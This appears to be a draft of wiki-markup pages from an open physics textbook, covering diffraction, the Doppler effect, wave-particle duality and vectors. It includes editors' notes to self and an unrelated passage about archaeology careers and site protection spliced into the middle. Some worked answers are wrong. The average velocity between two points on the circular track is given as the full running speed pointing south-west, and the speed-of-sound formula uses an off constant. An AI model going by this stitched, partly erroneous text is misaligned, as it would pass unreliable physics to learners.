| align=&quot;LEFT&quot; | : frequency of wave 2 (Hz or s&lt;sup&gt;-1&lt;/sup&gt;)
|}
&lt;/blockquote&gt;

== Properties of Waves : Diffraction ==

One of the most interesting, and also very useful, properties of
waves is diffraction. When a wave strikes a barrier with a
hole, only part of the wave can move through the hole. If the hole
is similar in size to the wavelength of the wave diffractions
occurs. The waves that comes through the hole no longer looks like
a straight wave front. It bends around the edges of the hole. If
the hole is small enough it acts like a point source of circular
waves.

This bending around the edges of the hole is called diffraction.
To illustrate this behaviour we start with Huygen's principle.

=== Huygen's Principle ===

Huygen's principle states that each point on a wavefront acts like
a point source or circular waves. The waves emitted from each
point interfere to form another wavefront on which each point
forms a point source. A long straight line of points emitting
waves of the same frequency leads to a straight wave front moving
away.

To understand what this means lets think about a whole lot of
peaks moving in the same direction. Each line represents a peak of
a wave.

[[Image:fhsst waves46.png|734px|]]

If we choose three points on the next wave front in the direction of
motion and make each of them emit waves isotropically (i.e. the same in all
directions) we will get the sketch below:

[[Image:fhsst waves47.png|734px|]]

What we have drawn is the situation if those three points on the
wave front were to emit waves of the same frequency as the moving
wave fronts. Huygens principle says that every point on the wave
front emits waves isotropically and that these waves interfere to
form the next wave front.

To see if this is possible we make more points emit waves
isotropically to get the sketch below:

[[Image:fhsst waves48.png|734px|]]

You can see that the lines from the circles (the peaks) start to
overlap in straight lines. To make this clear we redraw the sketch
with dashed lines showing the wavefronts which would form. Our
wavefronts are not perfectly straight lines because we didn't draw
circles from every point. If we had it would be hard to see clearly
what is going on.

[[Image:fhsst waves49.png|734px|]]

Huygen's principle is a method of analysis applied to problems of
wave propagation. It recognizes that each point of an advancing
wave front is in fact the center of a fresh disturbance and the
source of a new train of waves  and that the advancing wave as a
whole may be regarded as the sum of all the secondary waves
arising from points in the medium already traversed. This view of
wave propagation helps better understand a variety of wave
phenomena, such as diffraction.

=== Wavefronts Moving Through an Opening ===

Now if we allow the wavefront to impinge on a barrier with a hole in
it, then only the points on the wavefront that move into the hole
can continue emitting forward moving waves - but because a lot of
the wavefront have been removed the points on the edges of the
hole emit waves that bend round the edges.

[[Image:fhsst waves50.png|736px|]]

The wave front that impinges (strikes) the wall cannot continue
moving forward. Only the points moving into the gap can. If you
employ Huygens' principle you can see the effect is that the
wavefronts are no longer straight lines.

'''Riaan Note: still cant find this image, have to get it from the pdf'''

For example, if two rooms are connected by an open doorway and a
sound is produced in a remote corner of one of them, a person in
the other room will hear the sound as if it originated at the
doorway. As far as the second room is concerned, the vibrating air
in the doorway is the source of the sound. The same is true of
light passing the edge of an obstacle, but this is not as easily
observed because of the short wavelength of visible light.

This means that when waves move through small holes they appear to
bend around the sides because there aren't enough points on the
wavefront to form another straight wavefront. This is bending
round the sides we call diffraction.

== Properties of Waves : Dispersion ==

Dispersion is a property of waves where the speed of the
wave through a medium depends on the wavelength. So if two waves
enter the same dispersive medium and have different wavelengths
they will have different speeds in that medium even if they both
entered with the same speed.</text>

== Doppler Effect ==
The '''Doppler Effect''' is an interesting phenomenon that occurs when an object producing sound is moved relatively to the listener.

Consider the following: When a car blaring its horn is behind you, the pitch is higher as it is approaching, and becomes lower as it is moving away.  This is only noticeable if the object is moving at a fairly high speed, although it is still theoretically present at any speed.

When an object is moving '''away''' from the listener, the sound waves are stretched over a further distance meaning they happen less often.  The wavelength ends up being greater so the frequency is less and the pitch is lower.  When an object is moving '''towards''' the listener, the waves are compressed over a small distance making a very small wavelength and therefore a large frequency and high pitch.  Since the pitch of the sound depends on the ''frequency'' of the waves, the pitch increases when the object is moving towards the listener.

&lt;table WIDTH=&quot;75%&quot;&gt;&lt;tr&gt;&lt;td style=&quot;background-color: #00000; border: solid 2px #7B68EE; padding: 1em;&quot; valign=top&gt;
&lt;center&gt;&lt;big&gt;  &lt;math&gt;f' = f( \frac{v \pm v_0}{v \mp v_s} )&lt;/math&gt; &lt;/big&gt;&lt;/center&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;br&gt;f' is the observed frequency, f is the actual frequency, v is the speed of sound (&lt;math&gt; v=336+0.6T &lt;/math&gt;) T is temperature in degrees Celsius,  &lt;math&gt;v_0&lt;/math&gt; is the speed of the observer, and &lt;math&gt;v_s&lt;/math&gt; is the speed of the source. If the observer is approaching the source, use the top operator (the +) in the numerator, and if the source is approaching the observer, use the top operator (the -) in the denominator. If the observer is moving away from the source, use the bottom operator (the -) in the numerator, and if the source is moving away from the observer, use the bottom operator (the +) in the denominator.

===Example problems===
A. An ambulance, which is emitting a 40 Hz siren, is moving at a speed of 30 m/s towards a stationary observer. The speed of sound in this case is 339 m/s.

&lt;math&gt;f' = 40( \frac{339 + 0}{339 - 30} )&lt;/math&gt;

B. An M551 Sheridan, moving at 10 m/s is following a Renault FT-17 which is moving in the same direction at 5 m/s and emitting a 30 Hz tone. The speed of sound in this case is 342 m/s.


&lt;math&gt;f' = 30( \frac{342 + 10}{342 + 5} )&lt;/math&gt;

== Ultra-Sound ==
still to be completed

Ultrasound is sound that has too high a frequency for humans to hear. Some other animals can hear ultrasound though.  Dog whistles are an example of ultrasound. We can't hear the sound, but dogs can. Audible sound is in the frequency range between 20 Hz and 20000 Hz. Anything above that is ultrasound, and anything below that is called infrasonic.

Ultrasound also has medical applications.  It can be used to generate images with a sonogram. Ultrasound is commonly used to look at fetuses in the womb.

= Practical Applications of Waves: Electromagnetic Waves =

In physics, wave-particle duality holds that light and matter
simultaneously exhibit properties of waves and of particles. This
concept is a consequence of quantum mechanics.

In 1905, Einstein reconciled Huygens' view with that of Newton.  He
explained the photoelectric effect (an effect in which light did
not seem to act as a wave) by postulating the existence of
photons, quanta of energy with particulate qualities. Einstein
postulated that the frequency of light, &lt;math&gt;f&lt;/math&gt;, is related to the energy, &lt;math&gt;E&lt;/math&gt;, of its photons:


{| 
|-
|&lt;math&gt;\begin{matrix}E = hf\end{matrix}&lt;/math&gt;
|- 
| class=&quot;eqno&quot; align=&quot;RIGHT&quot; | 
(2.3)
|}

where &lt;math&gt;h&lt;/math&gt; is Planck's constant (&lt;math&gt;6.626\times10^{-34}Js&lt;/math&gt;).

In 1924, De Broglie claimed that all matter has a wave-like
nature.  He related wavelength &lt;math&gt;\lambda&lt;/math&gt; and momentum p:


{| 
|-
|&lt;math&gt;\begin{matrix}\lambda=\frac{h}{p}\end{matrix}&lt;/math&gt;
|- 
| class=&quot;eqno&quot; align=&quot;RIGHT&quot; | 
(2.4)
|}

This is a generalization of Einstein's equation above, since the
momentum of a photon is given by

where &lt;math&gt;c&lt;/math&gt; is the speed of light in vacuum, and &lt;math&gt;f = \frac{c}{\lambda}&lt;/math&gt;.

De Broglie's formula was confirmed three years later by guiding a
beam of electrons (which have rest mass) through a crystalline
grid and observing the predicted interference patterns. Similar
experiments have since been conducted with neutrons and protons.
Authors of similar recent experiments with atoms and molecules
claim that these larger particles also act like waves. This is
still a controversial subject because these experimenters have
assumed arguments of wave-particle duality and have assumed the
validity of de Broglie's equation in their argument.

The Planck constant h is extremely small and that explains why we
don't perceive a wave-like quality of everyday objects: their
wavelengths are exceedingly small. The fact that matter can have
very short wavelengths is exploited in electron microscopy.

In quantum mechanics, the wave-particle duality is explained as
follows: every system and particle is described by state functions
which encode the probability distributions of all measurable
variables. The position of the particle is one such variable.
Before an observation is made the position of the particle is
described in terms of probability waves which can interfere with
each other.</text>

NOTE TO SELF: SW: initially this chapter had a very mathematical approach. I have toned this down and tried to present in a logical way the
techniques of vector manipulation after first exploring the mathematical properties of vectors. Most of the PGCE comments revolved around
the omission of the graphical techniques of vector addition (i.e. scale diagrams), incline questions and equilibrium of
forces. I have addressed the first two  equilibrium of forces and the triangle law of three forces in equilibrium I think would be
better off in the Forces Chapter. Also the Forces chapter should include some examples of incline planes. Inclines are introduced here merely
as an example of components in action!</text>

* Please mention that although a rotation about an axis '''can''' be represented as a vector which statisfies your definition, the addition (composition) of two successive rotations about distinct axes is not obtained by simply adding the corresponding vectors. A better definition is: something which has direction and magnitude '''and''' adds by the parallelogram rule. (Alex)
* Mention that the direction of a vector is measured from its tail.
* Also include explanations of the ways in which to specify direction (e.g. bearing, compass points, angle from vertical, etc.)
* Include exam-type questions involving flowing rivers or aeroplanes in wind. These questions link displacement, velocity and time and also test the learners understanding of vectors combining to give a combined result (i.e. resultant).
* Mention that displacement at a point is the directed line from the start to that point.
* Rewrite section on velocity to make clear the distinction between average and instantaneous rates of change (velocity and speed). The &lt;math&gt;\Delta&lt;/math&gt;'s in the equations imply we are calculating average quantities. Mention that we take the limit of a small time interval to give instantaneous quantities. Perhaps the example of a parabola with average gradient and gradient of tangent can be used as an illustration. Else defer until chapter on Graphs and Equations of Motion. Instantaneous velocity: reading on the speedometer in a direction tangent to the path. Instantaneous speed is magnitude of instantaneous velocity but average speed is not equal to magnitude of average velocity. Average speed and average velocity are the total distance and resultant displacement over the time interval related to that part of the path. The example of the circular track uses these definitions and is an important illustration of the differences. Instantaneous calculated at a certain instant in time while average is calculated over an interval.
* Include relative velocity.

==Introduction==
``A vector is `something' that has both magnitude and direction.'' ```Thing'? What sorts of `thing'?&quot; Any piece of information which contains a magnitude and a related direction can be a vector. A vector should tell you how much and which way.

Consider a man driving his car east along a highway at 100 ''km''/''h''. What we have given here is a vector &amp;mdash; the car's velocity. The car is moving at 100 ''km''/''h'' (this is the magnitude) and we know where it is going &amp;mdash; east (this is the direction). Thus, we know the speed and direction of the car. These two quantities, a magnitude and a direction, form a vector we call velocity.

{{FHSST Physics/Box|'''Definition:''' A ''vector'' is a measurement which has both magnitude and direction.}}

In physics, magnitudes often have directions associated with them. If you push something it is not very useful knowing just how hard you pushed. A direction is needed too. Directions are extremely important, especially when dealing with situations more complicated than simple pushes and pulls.

Different people like to write vectors in different ways. Any way of writing a vector so that it has both magnitude and direction is valid.

Are vectors physics? No, vectors themselves are not physics. Physics is just a description of the world around us. To describe something we need to use a language. The most common language used to describe physics is mathematics. Vectors form a very important part of the mathematical description of physics, so much so that it is absolutely essential to master the use of vectors.

==Mathematical representation==

Numerous notations are commonly used to denote vectors. In this text, vectors will be denoted by symbols capped with an arrow. As an example,  &lt;math&gt;\overrightarrow{s}&lt;/math&gt;,  &lt;math&gt;\overrightarrow{v}&lt;/math&gt; and &lt;math&gt;\overrightarrow{F}&lt;/math&gt;are all vectors (they have both magnitude and  direction). Sometimes just the magnitude of a vector is required. In this case, the arrow is omitted. In other words, ''F'' denotes the magnitude of vector &lt;math&gt;\overrightarrow{F}&lt;/math&gt;. &lt;math&gt;|\overrightarrow{F}|&lt;/math&gt; is another way of representing the size of a vector.

==Graphical representation==

Graphically vectors are drawn as arrows. An arrow has both a magnitude (how long it is) and a direction (the direction in which it points). For this reason, arrows are vectors. 

In order to draw a vector accurately we must specify a scale and include a reference direction in the diagram. A scale allows us to translate the length of the arrow into the vector's magnitude. For instance if one chose a scale of 1''cm'' = 2''N'' (1''cm'' represents 2''N''), a force of magnitude 20''N'' would be represented as an arrow 10''cm'' long. A reference direction may be a line representing a horizontal surface or the points of a compass.

==Worked Example 2: Drawing vectors==

'''Question:''' Using a scale of  &lt;math&gt;1cm=2m.s^{-1}&lt;/math&gt; represent the following velocities:

a) &lt;math&gt;6m.s^{-1}&lt;/math&gt; north

b) &lt;math&gt;16m.s^{-1}&lt;/math&gt; east

Archaeology :  archaeology is the study of past human life by examining buildings and objects found in the ground.
Geology : the science that deals with the dynamics and physical history of the earth
Anthropology : the science that deals with the origins, physical and cultural development, biological characteristics, and social customs and beliefs of humankind
Paleontology : the science of the forms of life existing in former geologic periods, as represented by their fossils
History :  the branch of knowledge dealing with past events

== '''Requirement 2''' ==




Site location : First, the archaeologists try to locate sites. There are many ways to find sites.
1) Archaeologists can locate sites by looking for places where  there is a possibility that ancient cultures might have survived. A likely idea is near a river, but not close enough for houses to be affected by floods. An unlikely idea is in the center of a desert, far way from a source of water.

2) Some sites are found before a construction. Before a building construction, archaeologists are informed of the building. If they find artifacts, construction plans might have to be changed. Constrution might also be delayed.


Site excavation : 2nd, before the excavation the archaeologists separate the field into several areas. After that, they begin to protect the site. They forbid access to other people. At the end, they begin to excavate.

Artifact identification and examination : The assistance of specialists and the recourse to laboratories often are essential to date to determine materials or organizations, to study the human remainders.

Interpretation : After the study of the new data, the researcher proposes several assumptions on the object find.  This aspect determining of research often calls upon a gathering of specialized knowledge joined together in data bases.

Preservation : the preservation is of course out of question of preserving all the sites concealing of the vestiges.  It’s imperative to preserve the sites major and necessary to study the others before any destruction.  It is also advisable to ensure the conservation of the vestiges put at the day:  they are intended to enter public collections (museums), where they are then accessible to the researchers

Information sharing : The diffusion of the results of the excavations and the archaeological
studies constitutes an essential stage of the work of the archaeologist.  The ministry for the Culture and the Communication took this route by the means of a policy of edition and exposures in order to sensitize the public with archaeological research.  The regional services of archaeology publish each year a regional scientific assessment

1) The dating with carbon-14 is a method of measurement of the age of an organic subtance (time passed since the death).  The absolute age limits which can be measured is approximately 50 000 years.  The dating with the carbon-14 is a powerful tool thanks to which them archaeologists dates from the events before indatable, in particular those which are old of more than 6000 years (prehistoric).

2)the archeologists can date object with the style. For exemple in Greece, 
 
people black , background red  					(-620 ; -530)

people red, background black 					from -530

It is important to protect archaeological sites. The archaeological sites are unique. Many of the sites are broken. They need protection. The sites have been made by our ancestors. It’s important to protect these sites.

What people should do if they think they have found an artifact: 
When a person finds old objects, he must call to the cityhall. The cityhall can call to an archaeologist. Many sites are found during a construction of a road, building…. All states have laws to protect sites.

Ways in which you can be a protector of the past:
To protect archaeological sites, you must obey the law of protection of archaeological objects. don’t do escavation alone

 == '''requirement 7''' ==

- photos of all the world
- bible or other religious text
- map of the world
- book

Archaeologists will understand what the world was like with the photos, the map, and the books. 
They will understand what some people of the world think with the religious text.

''Egyptologist''
Egyptologist is the study of old Egypt.
A archaeologist need to work Latin and Greek. He does a archeologist’s school and to choose option Egyptologist.

[[Archaeologist under water]]

Subaqueous archaeology is research and the study of the vestiges in order to know the human activities of last and is practised in interior water:·
 artificial often closed:  wells, cisterns, underground conduits drowned,·
natural:  lakes, rivers, ponds, peat bogs, marshes, karst, and ground water

The aquatic environment is very favorable to archaeology:
water protects from the destructive human actions,
the organic and mineral elements safe from oxygen, the light and the biological organizations are preserved often perfectly.
A archaeologist under water need do a  school of archaeology an to practise swimming under water.

[[Restorer]] 
They need to do history of art and after to work in “conservation and restoration of the object”
they restore especially object into ceramic and sometimes out of glass exits of the archeologic excavation

= Some Examples of Vectors =


== Displacement ==

Imagine you walked from your house to the shops along a winding path through the veld. Your route is shown in blue in Figure 3.1. Your sister also walked from the house to the shops, but she decided to walk along the pavements. Her path is shown in red and consisted of two straight stretches, one after the other.

{| 
|-
|[[Image:fhsst_vectors2.png|228px|]]

|Figure 3.1: Illustration of Displacement
|}


Although you took very different routes, both you and your sister walked from the house to the shops. The overall effect was the same! Clearly the shortest path from your house to the shops is along the straight line between these two points. The length of this line and the direction from the start point (the house) to the end point (the shops) forms a very special vector known as ''' displacement'''. Displacement is assigned the symbol &lt;math&gt;\overrightarrow{s}&lt;/math&gt;

{{FHSST Physics/Box|'''Definition:''' ''Displacement'' is defined as the magnitude and direction of the straight line joining one's starting point to one's final point.}}

'''OR'''

{{FHSST Physics/Box|'''Definition:''' ''Displacement'' is a vector with direction pointing from some initial (starting) point to some final (end) point and whose magnitude is the straight-line distance from the starting point to the end point.}}

'''(NOTE TO SELF: choose one of the above)'''

In this example both you and your sister had the same displacement. This is shown as the black arrow in Figure 3.1. Remember displacement is not concerned with the actual path taken. It is only
concerned with your start and end points. It tells you the length of the straight-line path between  your start and end points and the direction from start to finish. The distance travelled is the length of the path followed and is a scalar (just a number). Note that the magnitude of the displacement need not be the same as the distance travelled. In this case the magnitude of your displacement would be considerably less than the actual length of the path you followed through the veld!

==Velocity==

{{FHSST Physics/Box|'''Definition:''' ''Velocity'' is the rate of change of displacement with respect to time.}}

The terms ''rate of change'' and ''with respect to'' are ones we will use often and it is important that you understand what they mean. Velocity describes how much displacement changes for a certain change in time.

We usually denote a change in something with the symbol &lt;math&gt;\Delta&lt;/math&gt; (the Greek letter Delta). You have probably seen this before in maths &amp;mdash; the gradient of a straight line is &lt;math&gt;\frac{\Delta y}{\Delta x}&lt;/math&gt;. The gradient is just how much ''y'' changes for a certain change in ''x''. In other words it is just the rate of change of ''y'' with respect to ''x''. This means that velocity must be

&lt;center&gt;&lt;math&gt;\begin{matrix}\overrightarrow{v}=\frac{\Delta \overrightarrow{s}}{\Delta t} =\frac{\overrightarrow{s}_{final}-\overrightarrow{s}_{initial}}{t_{final}-t_{initial}}\end{matrix}&lt;/math&gt;&lt;/center&gt;

'''(NOTE TO SELF: This is actually average velocity. For instantaneous''' &lt;math&gt;\Delta&lt;/math&gt;'s 
'''change to differentials. Explain that if''' &lt;math&gt;\Delta&lt;/math&gt; '''is large then we have average velocity else for infinitesimal time interval instantaneous!)'''

What then is speed? Speed is how quickly something is moving. How is it different from velocity? Speed is not a vector. It does not tell you which direction something is moving, only how fast. Speed is the magnitude of the velocity vector '''(NOTE TO SELF: instantaneous speed is the magnitude of the instantaneous velocity.... not true of averages!)'''.

Consider the following example to test your understanding of the differences between velocity and speed.

===Worked Example 3: Speed and Velocity===

'''Question:''' A man runs around a circular track of radius 100''m''. It takes him 120''s'' to complete a revolution of the track. If he runs at constant speed, calculate:

#his speed,
#his instantaneous velocity at point A,
#his instantaneous velocity at point B,
#his average velocity between points A and B,
#his average velocity during a revolution.

[[Image:fhsst_vectors3.png|197px|]]

'''Answer:'''&lt;br&gt;
:1. To determine the man's speed, we need to know the distance he travels and how long it takes. We know it takes &lt;math&gt;120 s&lt;/math&gt; to complete one revolution of  the track.   What distance is one revolution of the track? We know the track is a circle and we know its radius, so we can determine the perimeter or distance around the circle. We start with the equation for the circumference of a circle:

&lt;center&gt;&lt;math&gt;\begin{matrix}C &amp; =&amp; 2\pi r \\ &amp; = &amp; 2\pi (100m) \\&amp; = &amp; 628.3\;m.\end{matrix}&lt;/math&gt;&lt;/center&gt;

:2. Now that we have distance and time, we can determine speed. We know that speed is distance covered per unit time. If we divide the distance covered by the time it took, we will know how much distance was covered for every unit of time.
 
&lt;center&gt;&lt;math&gt;\begin{matrix} v &amp; = &amp;\frac{Distance\ travelled}{time\ taken} \\ &amp; = &amp; \frac{628.3m}{120s} \\ &amp; = &amp; 5.23\ m.s^{-1} \end{matrix}&lt;/math&gt;&lt;/center&gt;

:3. Consider point A in the diagram:

[[Image:fhsst_vectors4.png|192px|]] 

We know which way the man is running around the track, and we know his speed. His velocity at point A will be his speed (the magnitude of the velocity) plus his direction of motion (the direction of his velocity). He is moving at the instant that he arrives at A, as indicated in the diagram below.

[[Image:fhsst_vectors5.png|195px|]]

His velocity vector will be &lt;math&gt;5.23\ m.s^{-1}&lt;/math&gt; West.

:4. Consider point B in the diagram:

[[Image:fhsst_vectors6.png|197px|]]

:We know which way the man is running around the track, and we know his speed. His velocity at point B will be his speed (the magnitude of the velocity) plus his direction of motion (the direction of his velocity). He is moving at the instant that he arrives at B, as indicated in the diagram below.

[[Image:fhsst_vectors7.png|195px|]]

:His velocity vector will be &lt;math&gt;5.23\ m.s^{-1}&lt;/math&gt; South.

&lt;!-- :'''(NOTE TO SELF: add this here to further stress the difference between average and instantaneous velocities, as well as the difference between magnitude of average velocity and average speed!)''' [Student suggestion to principle editor: --&gt;

:4. So, now, what is the man's average velocity between Point A and Point B?
As he runs around the circle, he changes direction constantly. (Imagine a series of vector arrows pointing out from the circle, one for each step he takes.) If you add up all these directions and find the average it turns out to be ...Right. South west. And, notice that if you just looked for the average between his velocity at Point A and at Point B, that comes out south west, too. So his average velocity between Point A and Point B is &lt;math&gt;5.23\ m.s^{-1}&lt;/math&gt; south west.

&lt;!-- :''']''' --&gt;

:5. Now we need to calculate his average velocity over a complete revolution. The definition of average velocity is given earlier and requires that you know the total displacement and the total time. The total displacement for a revolution is given by the vector from the initial point to the final point. If the man runs in a circle, then he ends where he started. This means the vector from his initial point to his final point has zero length. A calculation of his average velocity follows:

&lt;center&gt;&lt;math&gt;\begin{matrix} \overrightarrow{v}&amp;=&amp;\frac{\Delta\overrightarrow{s}}{\Delta t} \\ &amp;=&amp; \frac{0m}{120s} \\ &amp;=&amp; 0\ m.s^{-1} \end{matrix}&lt;/math&gt;&lt;/center&gt;

{{FHSST Physics/Box|'''Remember:''' Displacement can be zero even when distance is not!}}

==Acceleration==
{{FHSST Physics/Box|'''Definition:''' ''Acceleration'' is the rate of change of velocity with respect to time.}}

Acceleration is also a vector. Remember that velocity was the rate of change of displacement with respect to time so we expect
the velocity and acceleration equations to look very similar. In fact:

{| 
|-
|&lt;math&gt;\begin{matrix}\overrightarrow{a}=\frac{\Delta \overrightarrow{v}}{\Delta t} =\frac{\overrightarrow{v}_{final}-\overrightarrow{v}_{initial}}{t_{final}-t_{initial}}\end{matrix}&lt;/math&gt;
|-
| class=&quot;eqno&quot; align=&quot;RIGHT&quot; | 
(3.2)
|}

'''(NOTE TO SELF: average and instantaneous distinction again! expand further &amp;mdash; what does it mean?)'''

Acceleration will become very important later when we consider forces.

== Force ==

Imagine that you and your friend are pushing a cardboard box kept on a smooth floor. Both of you are equally strong. Can you tell me in which direction the box will move ? Probably not. Because I have not told you in which direction each of you are pushing the box. If both of you push it towards north, the box would move northwards. If you push it towards north and you friend pushes it towards east, it would move north-eastwards. If you two push it in opposite directions, it wouldn't move at all !

Thus in dealing with force applied on any object, it is equally important to take into account the direction of the force, as the magnitude. This is the case with all vectors.</text>

= Mathematical Properties of Vectors =

Vectors are mathematical objects and we will use them to describe physics in the language of mathematics. However, first we need to
understand the mathematical properties of vectors (e.g. how they add and subtract).

We will now use arrows representing displacements to illustrate the properties of vectors. Remember that displacement is just one example
of a vector. We could just as well have decided to use forces to illustrate the properties of vectors.

== Addition of Vectors ==

If we define a displacement vector as 2 steps in the forward direction and another as 3 steps in the forward direction then adding them together would mean moving a total of 5 steps in the forward direction. Graphically, this can be seen by first following the first vector two steps forward, and then following the second one three steps forward: 

[[Image:fhsst_vectors8.png|598px|]]

We add the second vector at the end of the first vector, since this is where we now are after the first vector has acted. The vector from the tail of the first vector (the starting point) to the head of the last (the end point) is then the sum of the vectors. This is the tail-to-head method of vector addition.

The order in which you add vectors does not matter. In the example above, if you decided to first go 3 steps forward and then another 2 steps forward, the end result would still be 5 steps forward.

The final answer when adding vectors is called the resultant.

{{FHSST Physics/Box|'''Definition:''' The ''resultant'' of a number of vectors is the single vector whose effect is the same as the individual vectors acting together.}}

In other words, the individual vectors can be replaced by the resultant &amp;mdash; the overall effect is the same. If vectors &lt;math&gt;\overrightarrow{a}&lt;/math&gt; and &lt;math&gt;\overrightarrow{b}&lt;/math&gt; have a resultant &lt;math&gt;\overrightarrow{R}&lt;/math&gt;, this can be represented mathematically as,  &lt;math&gt;\begin{matrix}\overrightarrow{R} &amp;=&amp; \overrightarrow{a} + \overrightarrow{b}.\end{matrix}&lt;/math&gt;

Let us consider some more examples of vector addition using displacements. The arrows tell you how far to move and in what direction. Arrows to the right correspond to steps forward, while arrows to the left correspond to steps backward. Look at all of the examples below and check them. 

[[Image:fhsst_vectors9.png|395px|]]

[[Image:fhsst_vectors10.png|395px|]]

Let us test the first one. It says one step forward and then another step forward is the same as an arrow twice as long &amp;mdash; two steps forward.

It is possible that you end up back where you started. In this case the net result of what you have done is that you have gone nowhere
(your start and end points are at the same place). In this case, your resultant displacement is a vector with length zero units. We use the symbol &lt;math&gt;\overrightarrow{0}&lt;/math&gt; to denote such a vector: 

[[Image:fhsst_vectors11.png|395px|]]


[[Image:fhsst_vectors12.png|395px|]]

Check the following examples in the same way. Arrows up the page can be seen as steps left and arrows down the page as steps right.

Try a couple to convince yourself!

|- 
| align=&quot;CENTER&quot; | [[Image:fhsst_vectors13.png|137px|]]

| align=&quot;CENTER&quot; | [[Image:fhsst_vectors16.png|137px|]]
|}

It is important to realise that the directions aren't special &amp;mdash; ''forward and backwards'' or ''left and right'' are treated in the same way. The same is true of any set of parallel directions: 

{| cellpadding=&quot;3&quot;
|- 
| align=&quot;CENTER&quot; | [[Image:fhsst_vectors17.png|241px|]]

{| cellpadding=&quot;3&quot;
|- 
| align=&quot;CENTER&quot; | 
| align=&quot;CENTER&quot; | [[Image:fhsst_vectors19.png|173px|]]
|}

In the above examples the separate displacements were parallel to one another. However the same ''tail-to-head'' technique of vector addition can be applied to vectors in any direction. 

{| cellpadding=&quot;3&quot;
|- 
| align=&quot;CENTER&quot; | [[Image:fhsst_vectors20.png|214px|]]
| align=&quot;CENTER&quot; | [[Image:fhsst_vectors21.png|214px|]]
|}


[[Image:fhsst_vectors22.png|214px|]]

Now you have discovered one use for vectors; describing resultant displacement &amp;mdash; how far and in what direction you have travelled after a series of movements.

Although vector addition here has been demonstrated with displacements, all vectors behave in exactly the same way. Thus, if given a number of forces are acting on a body, you can use the same method to determine the resultant force acting on the body. We will return to vector addition in more detail later.

== Subtraction of Vectors ==

What does it mean to subtract a vector? Well this is really simple: if we have 5 apples and we subtract 3 apples, we have only 2 apples left. Now lets work in steps &amp;mdash; if we take 5 steps forward, and then subtract 3 steps forward, we are left with only two steps forward:

[[Image:fhsst_vectors23.png|598px|]]

What have we done? You originally took 5 steps forward but then you took 3 steps back. That backward displacement would be represented by an arrow pointing to the left (backwards) with length 3. The net result of adding these two vectors is 2 steps forward:

[[Image:fhsst_vectors24.png|598px|]]

'''Thus, subtracting a vector from another is the same as adding a vector in the opposite direction''' (i.e. subtracting 3 steps forwards is the same as adding 3 steps backwards).

This suggests that in this problem, arrows to the right are positive, and arrows to the left are negative. More generally, vectors in  opposite directions differ in sign (i.e. if we define up as positive, then vectors acting down are negative). Thus, changing the sign of a vector simply reverses its direction:

{| cellpadding=&quot;3&quot;
|- 
| align=&quot;CENTER&quot; | [[Image:fhsst_vectors25.png|168px|]]
| align=&quot;CENTER&quot; | [[Image:fhsst_vectors26.png|168px|]]
|}


{| cellpadding=&quot;3&quot;
|- 
| align=&quot;CENTER&quot; | [[Image:fhsst_vectors27.png|146px|]]
| align=&quot;CENTER&quot; | [[Image:fhsst_vectors28.png|146px]]
|}

|- 
| align=&quot;CENTER&quot; | [[Image:fhsst_vectors29.png|105px|]]
| align=&quot;CENTER&quot; | [[Image:fhsst_vectors30.png|105px|]]
|}

In mathematical form, subtracting &lt;math&gt;\overrightarrow{a}&lt;/math&gt; from  &lt;math&gt;\overrightarrow{b}&lt;/math&gt; gives a new vector &lt;math&gt;\overrightarrow{c}&lt;/math&gt;

&lt;center&gt;&lt;math&gt;\begin{matrix}\overrightarrow{c} &amp;=&amp; \overrightarrow{b} - \overrightarrow{a}\\&amp;=&amp; \overrightarrow{b} + (-\overrightarrow{a})\end{matrix}&lt;/math&gt;&lt;/center&gt;


This clearly shows that subtracting vector &lt;math&gt;\overrightarrow{a}&lt;/math&gt; from &lt;math&gt;\overrightarrow{b}&lt;/math&gt; is the same as adding &lt;math&gt;(-\overrightarrow{a})&lt;/math&gt; to &lt;math&gt;\overrightarrow{b}&lt;/math&gt;. Look at the following examples of vector subtraction.

[[Image:fhsst_vectors31.png|275px]]

== Scalar Multiplication ==

What happens when you multiply a vector by a scalar (an ordinary number)?

Going back to normal multiplication we know that &lt;math&gt;2 \times 2&lt;/math&gt; is just 2 groups of 2 added together to give 4. We can adopt a similar approach
to understand how vector multiplication works.

= Techniques of Vector Addition =

Now that you have been acquainted with the mathematical properties of
vectors, we return to vector addition in more detail. There are a number of
techniques of vector addition. These techniques
fall into two main categories- graphical and algebraic techniques.

== Graphical Techniques ==

Graphical techniques involve drawing accurate scale diagrams to denote
individual vectors and their resultants. We next discuss the two primary
graphical techniques, the tail-to-head technique and the parallelogram
method.

===The Tail-to-head Method===

In describing the mathematical properties of vectors we used
displacements and the tail-to-head graphical method of vector addition
as an illustration. In the tail-to-head method of vector addition the
following strategy is followed:

* Choose a scale and include a reference direction.
* Choose any of the vectors to be summed and draw it as an arrow in the correct direction and of the correct length- remember to put an arrowhead on the end to denote its direction.
* Take the next vector and draw it as an arrow starting from the arrowhead of the first vector in the correct direction and of the correct length.
* Continue until you have drawn each vector- each time starting from the head of the previous vector. In this way, the vectors to be added are drawn one after the other tail-to-head.
* The resultant is then the vector drawn from the tail of the first vector to the head of the last. Its magnitude can be determined from the length of its arrow using the scale. Its direction too can be determined from the scale diagram.

&lt;hr style=&quot;background-color:red&quot; /&gt;

====Worked Example 4 Tail-to-Head Graphical Addition I ====

'''Question:''' A ship leaves harbour H and sails 6''km'' north to port A. From here the ship travels 12''km'' east to port B, before sailing 5.5''km''
south-west to port C. Determine the ship's resultant displacement using the tail-to-head technique of vector addition.


'''Answer:'''

Now, we are faced with a practical issue: in this problem the displacements are too large to draw them their actual length! Drawing
a 2''km'' long arrow would require a very big book. Just like cartographers (people who draw maps), we have to choose a scale. The
choice of scale depends on the actual question- you should choose a scale such that your vector diagram fits the page. Before choosing a
scale one should always draw a rough sketch of the problem. In a rough sketch one is interested in the approximate shape of the vector diagram.

Step 1 : 

Let us draw a rough sketch of the situation

In a rough sketch one should include all of the information given in the problem. All of the magnitudes of the displacements are shown and
a compass has been included as a reference direction.

Step 2 : 

Next we choose a scale for our vector diagram. It is clear from the rough sketch that choosing a
scale where 1''cm'' represents 1''km'' (scale: 1''cm'' = 1''km'') would be a good choice in this
problem )- the diagram will then take up a good fraction of an A4 page. We now start the accurate construction.

Step 3 : 

'''Construction Step 1''': Starting at the harbour H we draw the first vector 6''cm'' long in the direction north (remember in the 
diagram 1''cm'' represents 1''km''): 


'''Construction Step 2''': Since the ship is now at port A we draw the second vector 12''cm'' long starting from this point in the direction east:

[[Image:fhsst_vectors33.png|644px|]]

